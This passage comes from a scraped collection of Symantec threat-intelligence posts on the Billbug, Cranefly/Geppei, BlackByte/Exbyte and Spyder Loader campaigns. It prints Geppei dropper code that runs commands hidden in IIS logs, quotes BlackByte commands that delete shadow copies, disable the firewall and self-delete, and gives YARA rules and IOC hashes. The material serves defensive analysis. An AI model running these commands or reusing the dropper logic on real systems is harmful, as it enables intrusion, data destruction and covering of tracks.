b'\\x53\\x12\\x76\\x23\\x94\\x89\\x78\\x45\\x58\\x31\\x62\\x83\\x77\\x95\\x59\\x17\\x31\\x47\\x73\\x50\\x22\\x34\\x65\\x89\\x49\\x12\\x67\\x41\\x90\\x35\\x91\\x37'realkey = datasample[:0x10]+ b'\\x00' * 0x10 for i in range(0x2000):realkey = hashlib.sha256(realkey + key).digest() raw = aes.cbc.decrypt(realkey, datasample[:16], datasample[16:]) print(\"checksum\", raw[-32:].hex())return raw[:-32] The encryption key is hardcoded, and was previously used in an older sample of this malware. The same encryption algorithm is used for network communication. The encrypted data structure is as follows: struct encrypted_data {byte[16] IV;byte[N] message_data;  // always divisible by 16, padding added as necessarybyte[32] sha256_checksum;} The sample stores configuration and state in the following file: %appdata%/microsoft/protect/windows/DMI%X.DAT(where %X is variable and depends on the parameter with which sample was started). It is also encrypted, but with RC4. This key was hardcoded in older versions of Sagerunex, but recent samples started to read the key from configuration instead. The config file modification date will always be in the year 2011 – the “file last edit” year is changed by the malware to 2011. Network communication In normal mode, the sample will try all the following supported connection modes in this order. In all cases, HTTPS is used, with user agent equal to: Mozilla/5.0 (compatible; MSIE 7.0; Win32). - 1: httpsviaconfigproxy: HTTPS with configured proxy - 2: httpswpadproxy: instead of using configured proxy, use proxy provided by WPAD mechanism (web proxy autodiscovery) - 3: httpsviaiexproxy: self-explanatory. Use proxy from \\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ProxyServer - 4: httpsviafirefoxproxy - get proxy from \\\\Mozilla\\\\Firefox\\\\profiles.ini (one of FF config files) - 5: httpsviaautoproxy - use proxy obtained from WinHttpGetIEProxyConfigForCurrentUser - 6: httpspreconfig -tryto connect without proxy The network packet is composed of two parts: the header and the payload. Both are encrypted separately. struct network_packet {byte[64] encrypted_header;  // see encrypted_data abovebyte[N] encrypted_payload;  // see encrypted_data above} The structure of the decrypted header is as follows: struct header {int32 command_id;int16 packet_length;int32 packet_crc32;} The structure of the decrypted payload mostly depends on the command ID. The list of supported commands includes: While we do not see data being exfiltrated in this campaign, Billbug is widely regarded as being an espionage actor, indicating that data theft is the most likely motivation in this campaign. The victims in this campaign – government agencies and a certificate authority – also point to an espionage and data-theft motive. The targeting of the government victims is most likely driven by espionage motivations, with the certificate authority likely targeted in order to steal legitimate digital certificates, as mentioned in the introduction. This is potentially very dangerous, as if Billbug is able to sign its malware with a valid digital certificate it may be able to bypass security detections on victim machines. The ability of this actor to compromise multiple victims at once indicates that this threat group remains a skilled and well-resourced operator that is capable of carrying out sustained and wide-ranging campaigns. Billbug also appears to be undeterred by the possibility of having this activity attributed to it, with it reusing tools that have been linked to the group in the past. For the latest protection updates, please visit theSymantec Protection Bulletin. 072022b54085690001ff9ec546051b2f60564ffbf5b917ac1f5a0e3abe7254a5 0cc6285d4bfcb5de4ebe58a7eab9b8d25dfcfeb12676b0c084e8705e69f6f281 148145b9a2e3f3abdc6c2d3de340eabc82457be67fb44cfa400a5e7bd2f88760 2a4302e61015fdf5f65fbd456249bafe96455cd5cc8aefe075782365b9ae3076 3585a5cbbf1b8b3206d7280355194d5442ed997f61e061fd6938a93163c79507 37fe8efe828893042e4f1db7386d20fec55518a3587643f54d4c3ec82c35df6d 3c35514b27c57a46a5593dbbbfceddbc49979b20fddc14b68bf4f0ee965a7c59 3dd7b684024941d5ab26df6730d23087037535783e342ee98a3934cccddb8c3e 64c546439b6b2d930f5aced409844535cf13f5c6d24e0870ba9bc0cf354d8c11 79f9f25b15e88c47ce035f15dd88f18ecc11e1319ff6f88568fdd0d327ad7cc1 7fe67567a5de33166168357d663b85bd452d64a4340bdad29fe71588ad95bf6f 80a8a9a2e91ead0ae5884e823dca73ef9fce59ff96111c632902d6c04401a4fe 861d1307913d1c2dbf9c6db246f896c0238837c47e1e1132a44ece5498206ec2 8f7c74a9e1d04ff116e785f3234f80119d68ae0334fb6a5498f6d40eee189cf7 a462085549f9a1fdeff81ea8190a1f89351a83cf8f6d01ecb5f238541785d4b3 adb61560363fcda109ea077a6aaf66da530fcbbb5dbde9c5923a59385021a498 bcc99bc9c02e1e2068188e63bc1d7ebe308d0d12ce53632baa31ce992f06c34a b631abbfbbc38dac7c59f2b0dd55623b5caa1eaead2fa62dc7e4f01b30184308 c4a7a9ff4380f6b4730e3126fdaf450c624c0b7f5e9158063a92529fa133eaf2 e4a460db653c8df4223ec466a0237943be5de0da92b04a3bf76053fa1401b19e f7ea532becda13a1dcef37b4a7ca140c56796d1868867e82500e672a68d029e4 f969578a0e7fe90041d2275d59532f46dee63c6c193f723a13f4ded9d1525c6b fea2f48f4471af9014f92026f3c1b203825bb95590e2a0985a3b57d6b598c3ff The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/espionage-asia-governments-cert-authority"
  },
  {
    "title": "cranefly new tools technique geppei danfuan",
    "content": "Update November 2, 2022:Updated with new information regarding the link to UNC3524. Symantec, byBroadcom Software, has discovered a previously undocumented dropper that is being used to install a new backdoor and other tools using the novel technique of reading commands from seemingly innocuous Internet Information Services (IIS) logs. The dropper (Trojan.Geppei) is being used by an actor Symantec calls Cranefly to install another piece of hitherto undocumented malware (Trojan.Danfuan) and other tools. The technique of reading commands from IIS logs is not something Symantec researchers have seen being used to date in real-world attacks. Initial analysis appeared to show a link between Cranefly activity and the activity of a group called UNC3524 thatMandiant published a blog about in May 2022. This link was primarily based on the use of the Regeorg webshell, however, as this is publicly available on Github, its use alone is not sufficient to establish a firm link. The first malicious activity Symantec researchers saw on victim machines was the presence of a previously undocumented dropper (Trojan.Geppei). It uses PyInstaller, which converts Python script to an executable file. Geppei reads commands from a legitimate IIS log. IIS logs are meant to record data from IIS, such as web pages and apps. The attackers can send commands to a compromised web server by disguising them as web access requests. IIS logs them as normal but Trojan.Geppei can read them as commands. The commands read by Geppei contain malicious encoded .ashx files. These files are saved to an arbitrary folder determined by the command parameter and they run as backdoors. The strings Wrde, Exco, and Cllo don't normally appear in IIS log files. These appear to be used for malicious HTTP request parsing by Geppei; the presence of these strings prompts the dropper to carry out activity on a machine. The attackers can use a dummy URL or even a non-existent URL to send these commands because IIS logs 404s in the same log file by default. flist = ['Wrde','Exco','Cllo','AppleWEBKit'] print('One Two Three') today = datetime.date.today() list1 = str(today).split('-') filename ='u_ex'+ list1[0][2:] + list1[1] + list1[2] +'.log' path ='C:/inetpub/logs/LogFiles/W3SVC1/'+ filename ifos.path.exists(path): shutil.copy(path,'C:\\\\windows\\\\temp\\\\IIS1.log') fp = open('C:\\\\windows\\\\temp\\\\IIS1.log','r') line = fp.readline()ifline != '': iflen(line.split('Wrde')) == 3: temp1 = line.split('Wrde') iflen(line.split('Exco')) == 3: temp2 = line.split('Exco') iflen(line.split('Cllo')) == 3: os.remove('C:\\\\windows\\\\temp\\\\IIS1.log') If the malicious HTTP request sample contains \"Wrde\" e.g.: The passed string to wrde() is decrypted by Decrpt(). The decrypted string is expected to look like the following: These are the malicious .ashx files, which are saved as: The backdoors that are dropped by this dropper include: When the malicious HTTP request sample contains \"Exco\", e.g.: The passed string to exco() is decrypted by Decrpt() and this decrypted string is an executable command by os.system(). If the malicious HTTP request contains \"Cllo\", function clear() is called. This function drops a hacking tool called sckspy.exe to disable eventlog logging for Service Control Manager. This appears to be another previously undocumented tool. It also appears that the clear() function attempts to remove lines that contain command or malicious .ashx file paths from the IIS log file; however, it does not inspect all lines so this function does not seem to work as intended. text4 ='[malicious base64 encoded exe file]' fw = open('c:\\\\windows\\\\temp\\\\DMI27F127.txt','w') os.system('certutil -decode c:\\\\windows\\\\temp\\\\DMI27F127.txt c:\\\\windows\\\\temp\\\\DMI27F127.cab') os.system('expand c:\\\\windows\\\\temp\\\\DMI27F127.cab c:\\\\windows\\\\system32\\\\sckspy.exe') os.system('c:\\\\windows\\\\system32\\\\sckspy.exe >c:\\\\windows\\\\temp\\\\DMI27F128.txt') fp = open('c:\\\\windows\\\\temp\\\\DMI27F128.txt','r') ifstr1.find('success') != -1: os.system('del c:\\\\windows\\\\temp\\\\DMI27F127.txt') os.system('del c:\\\\windows\\\\temp\\\\DMI27F127.cab') os.system('del c:\\\\windows\\\\system32\\\\sckspy.exe') os.system('del c:\\\\windows\\\\temp\\\\DMI27F128.txt') Dropped malicious .ashx files (i.e. Trojan.Danfuan and Hacktool.Regeorg) are removed in wrde() if it is called with option 'r': temp = info[2].replace('\\\\\\\\', '\\\\') os.system('del ' + temp) name = temp.split('\\\\') flist.remove(name[(-1)][:-1]) Hacktool.Regeorg has been used by multiple advanced persistent threat (APT) groups in the past, but as this code is publicly available on GitHub, its use does not offer sufficient clues for attribution. Symantec was unable to link this activity to any known groups. The use of a novel technique and custom tools, as well as the steps taken to hide traces of this activity on victim machines, indicate that Cranefly is a fairly skilled threat actor. While we do not see data being exfiltrated from victim machines, the tools deployed and efforts taken to conceal this activity indicate that the most likely motivation for this group is intelligence gathering. For the latest protection updates, please visit theSymantec Protection Bulletin. 12eaac1b8dc29ba29287e7e30c893017f82c6fadb73dbc8ef2fa6f5bd5d9d84e 981b28d7521c5b02f026cb1ba5289d61ae2c1bb31e8b256db21b5dcfb8837475 6dcfa79948cf90b10b05b59237cf46adb09b2ce53bc2c0d38fce875eccd3a7e1 0af8bf1fa14fe492de1cc870ac0e01fc8b2f6411de922712a206b905a10ee379 7d5018d823939a181a84e7449d1c50ac3eb94abf3585a2154693ef5180877b95 b5a4804cf7717fda1f01f23c1c2fe99fe9473b03f0247bcc6190f17d26856844 1975bea7ca167d84003b601f0dfb95c4b31a174ce5af0b19e563cb33cba22ffa 56243c851b13218d3031ca7e5af8f2b891e139cbd6d7e3f40508e857802a1077 0b8d024ec29619ff499e4b5024ff14451731a4e3155636a02ef5db2df0e0f0dd 0b168638224589937768eb15c9ebbe795d6539d1fbe744a8f065fedd569bfc5e The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/cranefly-new-tools-technique-geppei-danfuan"
  },
  {
    "title": "blackbyte exbyte ransomware",
    "content": "Symantec’s Threat Hunter Team has discovered that at least one affiliate of the BlackByte ransomware (Ransom.Blackbyte) operation has begun using a custom data exfiltration tool during their attacks. The malware (Infostealer.Exbyte) is designed to expedite the theft of data from the victim’s network and upload it to an external server. BlackByte is a ransomware-as-a-service operation that is run by a cyber-crime group Symantec calls Hecamede. The group sprang to public attention in February 2022 whenthe U.S. Federal Bureau of Investigation (FBI) issued an alertstating that BlackByte had been used to attack multiple entities in the U.S., including organizations in at least three critical infrastructure sectors. In recent months, BlackByte has become one of the most frequently used payloads in ransomware attacks. The Exbyte exfiltration tool is written in Go and designed to upload stolen files to the Mega.co.nz cloud storage service. On execution, Exbyte performs a series of checks for indicators that it may be running in a sandboxed environment. This is intended to make it more difficult for security researchers to analyze the malware. To do this, it calls the IsDebuggerPresent and CheckRemoteDebuggerPresent APIs. It then checks for the running processes from the following applications: It then checks for the following anti-virus or sandbox-related files: This routine of checks is quite similar to the routine employed by the BlackByte payload itself,as documented recently by Sophos. Next, Exbyte enumerates all document files on the infected computer, such as .txt, .doc, and .pdf files, and saves the full path and file name to %APPDATA%\\dummy. The files listed are then uploaded to a folder the malware creates on Mega.co.nz. Credentials for the Mega account used are hardcoded into Exbyte. Exbyte is not the first custom-developed data exfiltration tool to be linked to a ransomware operation. In November 2021,Symantec discovered Exmatter, an exfiltration tool that was used by the BlackMatter ransomware operation andhas since been used in Noberus attacks. Other examples include the Ryuk Stealer tool and StealBit, which is linked to the LockBit ransomware. In recent BlackByte attacks investigated by Symantec, the attackers exploited the ProxyShell (CVE-2021-34473,CVE-2021-34523, andCVE-2021-31207) and ProxyLogon (CVE-2021-26855andCVE-2021-27065) vulnerabilities in Microsoft Exchange Servers to gain initial access. Symantec has observed attackers using AdFind, AnyDesk, NetScan, and PowerView prior to deploying the ransomware payload. Recent attacks have used version 2.0 of the BlackByte payload. On execution, the ransomware payload itself appears to download and save debugging symbols from Microsoft. The command is executed directly from the ransomware: powershell -command \"(New-Object Net.WebClient).DownloadFile('http://msdl.microsoft.com/download/symbols/ntkrnlmp.pdb/11D60DB07BA7433B923F49867DF515721/ntkrnlmp.pdb', 'CSIDL_SYSTEM_DRIVE\\systemdata\\ntkrnlmp.pdb')\" The ransomware then checks the version information of ntoskrnl.exe and then creates a service with the following details: binPath = C:\\systemdata\\generalate displayName = AAAAAAAAAAAAAA!!!!!!!!!!!!!!! BlackByte then proceeds with the removal of Kernel Notify Routines. The purpose of this is to attempt to bypass EDR products. This functionality in BlackBytehas already been documented by Sophosand it closely resembles the techniques leveraged inthe EDRSandblast tool. BlackByte uses VssAdmin to delete volume shadow copies and resize storage allocation: cmd.exe /c start vssadmin.exe Delete Shadows /All /Quiet vssadmin Resize ShadowStorage /For=K: /On=K: /MaxSize=401MB It then makes the following service modifications: sc create ODosTEmONa binPath= CSIDL_SYSTEM_DRIVE\\systemdata\\generalate type= kernel sc.exe config RemoteRegistry start= auto sc.exe config Dnscache start= auto sc.exe config SSDPSRV start= auto sc.exe config fdPHost start= auto sc.exe config upnphost start= auto The ransomware then modifies firewall settings to enable linked connections: netsh advfirewall firewall set rule \"group=\\\"Network Discovery\\\" \" new enable=Yes\" netsh advfirewall firewall set rule \"group=\\\"File and Printer Sharing\\\" \" new enable=Yes\" cmd.exe /c netsh advfirewall set allprofiles state off Finally, BlackByte injects itself into an instance of svchost.exe, conducts file encryption, and then deletes the ransomware binary on disk: cmd.exe /c ping 1.1.1.1 -n 10 > Nul & Del CSIDL_WINDOWS\\rdac.exe /F /Q CSIDL_SYSTEM\\svchost.exe -s 27262842 Following the departure of a number of major ransomware operations such as Conti and Sodinokibi, BlackByte has emerged as one of the ransomware actors to profit from this gap in the market. The fact that actors are now creating custom tools for use in BlackByte attacks suggests that it may be on the way to becoming one of the dominant ransomware threats. For the latest protection updates, please visit theSymantec Protection Bulletin. copyright = \"Symantec\" family = \"Alias:ExfilTool\" description = \"Detects exfil tool used by BlackByte ransomware\" $data_str1 = {41 B9 04 00 00 00 66 66 0F 1F 84 00 00 00 00 00 43 0F B6 84 02 A0 00 00 00 41 30 00 49 FF C0 49 83 E9 01 75 EB 49 83 EB 01 75 D5 40 B7 09 48 8D} $data_str2 = {32 10 05 AF 59 2E 0D 38 32 59 C0 99 E8 A5 87 CB} $data_str3 = \"@BCEFHJLNPRTVY\" ascii and filesize > 2MB and filesize < 3MB and (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) rule blackbyte_exfil_unpacked copyright = \"Symantec\" family = \"Alias:ExfilTool\" description = \"Detects unpacked exfil tool used by BlackByte ransomware\" $str2 = \").NewUpload\" $str3 = \").CreateDir\" $str4 = \".PreloginMsg\" $str5 = \".UploadCompleteMsg\" $str6 = \").UploadFile\" $str7 = {FF 20 47 6F 20 62 75 69 6C 64 69 6E 66 3A 08 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 07 75 6E 6B 6E 6F 77 6E 00 00 00 00 00 00 00 00} $c1 = {44 24 68 44 31 C2 88 50 10 0F B6 54 24 56 44 0F} $c2 = {FB 48 89 F7 4C 89 C6 E8 54 ED F6 FF 4C 8D 43 01} all of ($str*) and ($c1 or $c2) and filesize > 8MB  and (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 3fb160e1770fafeedff2d77841bf02108c25cca4cb6d77e3fbf759077f356b70 - Infostealer.Exbyte 0097b8722c8c0840e8c1a4dd579438344b3e6b4d630d17b0bbe9c55159f43142 - Infostealer.Exbyte aeb1b789395357e8cc8dbd313b95f624fc03e037984040cd7c1704775bfb4bd2 - Infostealer.Exbyte 477382529659c3452020170d8150820210ab8cbdc6417a0f0ac86a793cd0d9b4 - Ransom.Blackbyte 1df11bc19aa52b623bdf15380e3fded56d8eb6fb7b53a2240779864b1a6474ad - Ransom.Blackbyte 44a5e78fce5455579123af23665262b10165ac710a9f7538b764af76d7771550 - Ransom.Blackbyte eb24370166021f9243fd98c0be7b22ab8cbc22147c15ecef8e75746eb484bb1a - Ransom.Blackbyte f361bafcc00b1423d24a7ea205264f5a0b96011e4928d9a91c2abc9911b433a1 - Ransom.Blackbyte 20848d28414d4811b63b9645adb549eed0afbd6415d08b75b0a93fbf7cfbf21f - Ransom.Blackbyte 754ac79aca0cc1bcf46000ef6c4cbe8bebeb50dae60823a1e844647ac16b6867 - Ransom.Blackbyte f157090fd3ccd4220298c06ce8734361b724d80459592b10ac632acc624f455e - AdFind 794a5621fda2106fcb94cbd91b6ab9567fb8383caa7f62febafcf701175f2b91 - AdFind batch script 572d88c419c6ae75aeb784ceab327d040cb589903d6285bbffa77338111af14b - NetScan efc2125e628b116eb0c097c699e473a47a280dfcd3e02cada41bdf6969600b41 - PowerView 4877ff7c3c2abd349646db1163814811e69b36374e289f5808cc794113ef55ae - AnyDesk hxxp://gfs270n392[.]userstorage.mega.co[.]nz/ul/PCfY6R3GKGjIEQK2tzWLODSlhG-h5NbxGHdNAToANCzjKK8Z6kdCiqshxM6ctHDKpLU09-YobgYybaQkCnpwnw/4718592 hxxp://gfs262n303[.]userstorage.mega.co[.]nz/ul/f_re9dP6f9G8GAJhd3p43aJnvHnw7rCHLumJV-MXDlaL2RaSQQrPH1BYStJHWy4JkPgJ13KczuiJoOl0iwjxDA/15204352 hxxp://gfs206n171[.]userstorage.mega.co[.]nz/ul/9Y39ts0Mp6xtige0-wHhmMG74YgASgG1UhZYfzl_fh8TN_TQo1gSa92TNe_HTBxvOTirA0yfouEE74-Y3Cy1Tw/81264640 hxxp://gfs206n108[.]userstorage.mega.co[.]nz/ul/aX72PSSxERHKJwLdWCCOmsJQRioP7N6kcAltRRTbAgwGtNzcsdYa_7HTb4ToVV_HcVPORXotYAF5WqFAsmAOKA/15204352 hxxp://gfs208n174.userstorage[.]mega.co.nz/ul/z6nR8uTohiga4QeILJsXcAWlt05Vhu2XiDlne_Qag-rgAmZkK2aZMvYrWC5FHRebBpMoxYZEEqSStHyvU6SnWQ/6815744 hxxp://gfs214n129.userstorage[.]mega.co.nz/ul/wVJUlrn9bMLekALaMZx_o5FeK-U1oG9q4CWqHGNslUnVY2-BgJcEUxIJX9O4fXEWkt-x80LeAr7Jz9gXTCwzDA/2752512 hxxp://gfs204n140.userstorage[.]mega.co.nz/ul/_Amu75VCTCu6BgIdFs8ZgHPyHqBFm5Cj8bV1xkM5QFt2T0x-9C_KlHQAQ3kX4bzj8jgmyK9-dlbmx9ef6Y9JDw/1966080 The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/blackbyte-exbyte-ransomware"
  },
  {
    "title": "spyder loader cuckoobees hong kong",
    "content": "Symantec has observed a likely continuation of the Operation CuckooBees activity, this time targeting organizations in Hong Kong. Operation CuckooBeeswas first documentedin May 2022 by researchers at Cybereason, who said the intelligence-gathering campaign had been operating under the radar since at least 2019, stealing intellectual property and other sensitive data from victims. In the attacks observed by Symantec, the attackers remained active on some networks for more than a year. We saw the Spyder Loader (Trojan.Spyload) malware deployed on victim networks, indicating this activity is likely part of that ongoing campaign. While we did not see the ultimate payload in this campaign, based on the previous activity seen alongside the Spyder Loader malware it seems likely the ultimate goal of this activity was intelligence collection. The Spyder Loader malware wasfirst discussed publicly in a March 2021 blog by SonicWall, with the researchers saying at the time that the malware was “being used for targeted attacks on information storage systems, collecting information about corrupted devices, executing mischievous payloads, coordinating script execution, and C&C server communication.” These initial findings were expanded on substantiallyin a detailed Cybereason investigation published in May 2022, which detailed a long-running campaign that the researchers dubbed Operation CuckooBees. They said that this campaign had been ongoing since at least 2019. The researchers said that the attackers exfiltrated hundreds of gigabytes of information and that they “targeted intellectual property developed by the victims, including sensitive documents, blueprints, diagrams, formulas, and manufacturing-related proprietary data.” They also stole data that could be leveraged for use in future cyber attacks — such as credentials, customer data, and information about network architecture. Among the tools used in that campaign was the Spyder Loader malware, which is what was also observed in the activity seen by Symantec researchers. The loader sample analyzed by Symantec researchers is compiled as a 64-bit PE DLL. It is a modified copy of sqlite3.dll, with the following malicious export added: The sqlite3_prepare_v4 export expects a string as its third argument. Reportedly, whenever an export is executed by rundll32.exe, the third argument of the called export should contain part of the process command-line. When this loader is executed, it extracts the file name from its third argument, and the referred file is expected to contain a sequence of records. Each record has the following structure: At minimum, the malware sample requires records storing blob_ids 1 and 2. The sample also checks for the optional blob_ids 3 and 4. For blob_ids 1 and 2, the content of encrypted_blob is encrypted using the AES algorithm in Ciphertext Feedback (CFB) mode with segment_size of 0x80 bits. The encryption key is based on the name of an affected computer per GetComputerNameW() API: And the initialization vector (IV) is derived from the corresponding record header: Then the sample creates FileMapping with the following parameters: Next, it populates the created FileMapping with: Then it checks the status of service IKEEXT and stops the service, if running. Next, it drops the decrypted content of blob_id 1 as the following file, before starting the service: This is apparently intended to execute the created wlbsctrl.dll file. It is likely that this file acts as a next-stage loader that executes the content of blob_id 2 from the created FileMapping. It is possible that the remaining optional blobs could then be used for follow-up stages and/or configuration data. However, as Symantec researchers did not observe these additional content blobs being executed, this is speculative. As previously mentioned, AES encryption is used where the sample uses the CryptoPP C++ library, but ChaCha20 algorithm encryption is also used to obfuscate one of the strings. The malware also cleans up created artifacts, overwriting the content of the dropped wlbsctrl.dll file before deleting it, for example. These steps are most likely taken in order to prevent the activity being analyzed. Debug strings also indicated that the source code location of the malware was the following: Similarities between this activity and the Spyder Loader activity described by Cybereason include: These various similarities led us to conclude that this sample was also a version of the Spyder Loader malware. We saw various variants of Spyder Loader on victim networks, all displaying largely the same functionality. We saw assorted other malware samples that carried out various other types of activity on victim networks, including a modified SQLite DLL with the malicious exportsqlite3_extension_init,which creates and starts a service named GeneralManintenanceWork for a file named data.dat. We also saw Mimikatz being executed on victim networks, as well as a Trojanized ZLib DLL that had multiple malicious exports, one of which appeared to be waiting for communication from a command-and-control (C&C) server, while the other would load a payload from the provided file name in the command-line. Another sample installs and runs the below component of winpcap as a service: Files with the namesnpf.sysandpacket.dllare then installed. While we do not see the final payload delivered in this campaign, the use of the Spyder Loader malware and crossover with the activity previously identified by SonicWall and Cybereason, combined with the victims seen in this recent activity, make it most likely that the motivation behind this activity is intelligence gathering. The fact that this campaign has been ongoing for several years, with different variants of the Spyder Loader malware deployed in that time, indicates that the actors behind this activity are persistent and focused adversaries, with the ability to carry out stealthy operations on victim networks over a long period of time. Companies that hold valuable intellectual property should ensure that they have taken all reasonable steps to keep their networks protected from this kind of activity. For the latest protection updates, please visit theSymantec Protection Bulletin. 00634e46b14ba42c12e35a367f1c7a616fb8e8754ebb2e24ae936377a3ee544a 033313b31fbea64a1a0a53b38c74236f7af2e49018faa2be6c036427c456ef6d 06ed28c4ae295dec0bd692cd7fcecb5fa9de644968d281f5e4bf48eb72bc4b63 091e3e806b6d66cf1eccbd57a787eec65df5f07ad88118c576b3ae06c08af744 0cdbde55b23b26efd5c4503473bd673e3e5a75eae375bae866b6541edb8fcc84 181a25cbcd050c1b42839a5d32df4f59055e27377e71eaa3eb9230a43667f075 228784cc7dad998f1f8b7395bf758827eff9b27762a7056d9e8832bb8a029aad 260d54c2fcf725a8b6d030c36ca26f65ba3d01f707fa0e841cac0166d06218c0 2879253c8c8dd3ee53525c81801d813594bb657ad4f7478ba4288112f0315c9e 2da683d54f12d83f0f111b5c57f7f78016cad5860b2604d38b2aba37ab3d5c55 3196e74004816227323d6864448361fb173b3c96cf3d1b0aa26dfcd259a61505 33aa5df5470ae59cd30c7ea4c2ad1e13901a8fd13ea6b4b5584d10ffdba31ee4 396e35b2a4f920182d3148c834cf70f00b6094600e51e030d6fc297cb0ca5c06 3b3df3ada05e521ec8ce2f0deaeb6fd4359a2de9cadb0dd51c0d9d7a835473a4 3d96132412d8587849aa5dfd35c968755b30a08b100ec42eb810ff1f042e9fd0 3e10500c3779e56d2daa05da920d014becf33597f5ccb67c069320c5c43d40d2 4164cfc533621e37c8ad910f29d4afa92d0180c1697b7970746243574029a1f1 417a65be8ef81cb36021dbe56b07bf5dd65b7355e61b7a94bc988aaa335b22da 4221362bba10aedbb2d09729567d090f543c5de8543ec55ca4a6516815202064 438dddd93333ccfce4499558c92b20341166a134a8451ffc60ebf6ec5e0890dc 48658c800b724197cb91cbfd064df060221bc72bd77301707cb30b2f7c2b81fb 4a9cd0c32d6992077d3140917928f1b931bb2bf28e88f0dd8e4c92cd5d9cbe00 4bc3a4e4d74b81acf19621da7c8304527fff954747ab3393b78e0758306b3fa6 4d8784b957d826acc00e5a87d7317bbaeb63c7f9f86a5f446a41a5a355de437e 4dfae8301a9284eea4e975476ceaa652d5d3c799879dec7c5c9e18bbc2930885 54bcd44d4606e0fdb1b7c2110684f429f9e234269d213ddb60c9665e7b8679c7 551794bd7c66fb064d81230161b25ed81a714aa9377f2a9a1af69626dc99d385 5bf03354d708d3c87e82a50d3f4c948fc8c6e8186537b0463edafd9546b51333 5cf6bca323851a509120399a975edc759a9d2c5c21aff18ee6cae506b0f93d67 5deab41977d5d6217b3e35cfab81015d83f270650ccc170dfb948e55e92478dd 5f477c03a689b4aeed28dcb2f8bab3dfa7fc834223062f16eddb5426c2cfa2e6 6741a9ea57e38d1e9d6014bd191b0ac517d2bfa2d79cb091c64fb8011c8521d3 69d927abbacdfcdcad0a1d878e8c0a8543a940a101447b9127365034f7a2d773 6d07ce2ca82489599ae609c6ed18f587059ed5cf2d32a513c5ea6d35861695e9 6d689996a8721f8417de46d645dc6b66b261afdf8ee30b4a0853ff94ec87d3b0 72424e99c1814a1d741508c198eac3e3e84626ce39d961c014718e7f8abb6fe5 7443e17e80dec2db6cfffc0a272fd8a27b2a98a42ffc15fb9065c072dc5904f7 74ff4db3af082d73dcba597cacfd4cae64e00c68169a64be2f3715a0f06535ae 7ccb9cdaff8c6c7785ee1422aa70723c976f62795593b02fbf0923f09c6b647d 7ecd5ec38db31cfb7146ac684eb75912e418c3fbb69a2562478b5fce2ae2c615 8344fcc55534f0b0e08f48f44607771d7cfad130f749ddcc434ffc6fd9012eaa 8535a6e49afa4057e504fa8f4a21a06f535f51bbafff0631c662d7ade5aabfb9 8648bb183abf8aa2111f4d98ecc386e5bcdfa614033efdd124d61ee155261a13 86a45d92282ed3c4f82687eb1d6cfa6a906d6fc5033014bdc6c57da07db1b1b2 892c1f324fa5c2370b06dedf691bd60fa0aa70a4bd6502b9c615cdcd3d5e698a 8a42bee7190e23f76e46e66f9194c33f33a60903a28d267acebf4fd8dead15e8 8a8109f2af10898cdf7259467d18410f2b61a89d5f0d7031b5e45e1bd3b8678a 8eeba9d12cd01b8eb245c76ff16e34eb0455001243fcf1889f28655e55c1d1ed 8fe7cc990ffaf4f156c0868b41e1e92d09c1270e11b96c7320498e0390cc93c6 9138916b9630c81a0b7b6597f4be72ca46c7e3dc1e6fd89d14ddb12f1deb7fdc 95bc468f50483f337d3ef6e1c5d1765beffee4db9c057d6e49713b3a099b2eef 96e22da2b69f599cba297a9aafc971a09c99433bf7f51ec37446c34ed3701d12 9b114bfec2561e76fd8d0c9b31633c2089abec8f3a99c297f0f6416838567452 9b7d8827685b71e92438355872f10c2364d7e3a3811df884eb41e371bcda8f6d 9daa43c1204184634b9833718155404d6c0366fcdd524f945eacfc3e5760c116 a43c9dbfd2a9c1a065eb7a9212f2125ea6e6a73256081bc2deacd50913162a6a a7f291bde213d9eb4fa60fb3517a6ec6fb7a057457534afe895c1684db0ba21d b02c10d8a83857352c99f09548397bf8e0ee0548b8e050e138b82eb08b98e938 b13bc2986f098580e2432dac7004a9dca2254c6756dafa3b7f67aff743ee060f b382824cbb11c60da6c733855c825dcbdf2bbfb8104a517d27af56b56625ba9f b4703af681c75d2d16c555f008bc4308a4d03767ceed55c02d1a892341444304 b4841104c663f4f013b467220d576035fd2187a92c84451709abff47c8fb162e b4cdc814f1536264cc5e469cebcbf351ee9d1b9620248bc0a6b14725fe38d5a0 b82a19a06270f37e3b12047a1382796678895fe1c58a9ef799cf5250f6c96dcf c01f402b942502889aa854326405b29a4d33947547074fbb9eab7c4c4a896d77 c276300d47daff9cc1e486e4ea3d776d82fa9b3f8161eccfe49fc3218afdfbe9 c3d41387bcc9c9f2d9858b1286ed51369a06ed12abe7623344a31a0e0f18f36a c57236c2e7fe84334d5bdef6420cbf121ab9f918f5d8e4323d7055b12947abb6 c862f2cdbf817f6d7c5568a4af2d8766a30719297e31a71620503e50176fceb2 ccaa5186451c0658b6294f5d8a78b3ec02505164c1ddec2b418259564cd7b23b cd5a53fc5bb675b47bb4055d8f3e4c45902a8245df2300ccf03d7da6464add78 cdaaf781557e85582dd42ff6a58ecbbb68a7cb2e0dc7c7aa49b1d5df5391330b d06730e1d07491a70b4b18b52e8f35c92509b5049239e3794a6be73ce160e2c0 d2939897865906fb339e878f620f928bff36c7dead15bb6ed94f7a9df16300e9 d3a163a7313629cc380b9405aafb847247d2a256ae48b60bffd0bfbe3082c19c d76e32647c3890100fe994a9a0f84a3e6957af08195366e86299e4033c2551f1 dbc60a4878ae9f1a2184c44837db9968a157f2008a16e3a350909a598f918dd9 dc4218b67f99196fb5d71c4bd5ce762e9b8950d8206e198a755650c5e6d17fd0 dc647ce87c62b0ac76530362694d1dafdca5ca414e5abb18c324dfd24f0e9644 